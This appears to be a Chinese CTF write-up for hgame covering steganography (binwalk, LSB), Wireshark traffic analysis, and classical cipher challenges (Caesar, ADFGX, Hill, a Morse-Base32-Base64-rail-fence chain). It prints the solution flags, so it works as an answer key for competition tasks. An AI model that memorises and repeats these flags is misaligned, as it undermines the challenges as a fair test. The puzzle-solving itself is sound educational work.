拿到flag.png,先到binwalk跑一下，发现有一个zlib文件，emmmm然后卡住了，感觉这条路走不通 又试了一下LSB隐写，发现RGB的0通道里面与一个flag.txt,提取出相应的数据，用binwalk分离得到flag.txt,打开即可得到flag。 白菜2 拿到一张misc.jpg,binwalk看一下，发现有一个zip压缩包，分离出来解压缩即可得到flag。 pacp1 典型的流量分析，用wireshark打开，筛选HTTP流量，发现第557个包有一个访问flag.php的请求，第559个包回复相关信息，查看详细字段即可得到flag。 cryptoeasy Caesar 这题卡了很久，对密文进行凯撒解密发现有一个hgame开头的结果，应该就是我们要的flag，但是提交不上去，后面百度了一下这句话，发现语义为“The quick brown fox jumps over a lazy dog”，结合我们解出来的“The_qu8ck_br7wn_1x_jUmps_ovEr_a_La9y_dOg”，一下子没了思路，后面才知道是数字也要类似凯撒密码进行移位，n=3，即可得到flag。 Polybius 又是一个没见过的英语单词，放上去百度一下，发现是“波利比奥斯方阵密码”，非常高兴。但是方阵密码是用1-5的数字表示字母密文的。猜想一下，应该是有变形，查找一下，果然是这样。变形的密码用A、D、F、G、X五个字母表示，跟题目给出的内容吻合，完美！ 两位字母表示一个密文，如AF=a，字母j和i视为同一个字母。得出hgame{fritz_nebel_invented_it} Hill 老办法，百度一下，发现的希尔密码，秘钥是9 17 6 5，后面的字母是密文。这里有一个在线解密网站：http://www.practicalcryptography.com/ciphers/hill-cipher/跑一下得到flag:hgame{overthehillx}。 confusion 摩斯密码：MRLTK6KXNVZXQWBSNA2FSU2GGBSW45BSLAZFU6SVJBNDAZSRHU6Q==== Base32:dW5yWmsxX2h4YSF0ent2X2ZzUHZ0fQ== Base64 : unrZk1_hxa!tz{v_fsPvt} 栅栏: n=2 unrZk1_hxa!tz{v_fsPvt} 凯撒: hgame{Mix_1s_fuCking!} baby step没解出来QAQ]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
</search>
